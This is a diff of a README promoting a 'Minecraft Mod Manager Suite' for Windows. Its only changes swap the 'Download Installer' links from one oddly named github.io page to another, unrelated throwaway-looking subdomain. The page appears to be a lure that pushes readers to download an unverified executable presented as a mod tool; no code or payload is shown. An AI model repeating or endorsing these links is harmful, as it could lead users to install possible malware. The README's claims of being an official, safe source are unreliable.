@@ -2,7 +2,7 @@
 
 Welcome to the Minecraft Mod Manager Suite, your ultimate solution for enhancing your Minecraft experience on Windows. This tool simplifies the process of downloading, installing, and managing mods, shaders, and texture packs, making it perfect for both beginners and advanced users in 2026. With support for popular Minecraft versions like 1.21 and 1.21.4, you can easily access a world of customization.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## System Requirements
 
@@ -79,7 +79,7 @@ A: No, but for best results, we recommend having Minecraft installed. The tool c
 
 For the latest version and updates, download the installer directly from our GitHub page.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Last Updated
 
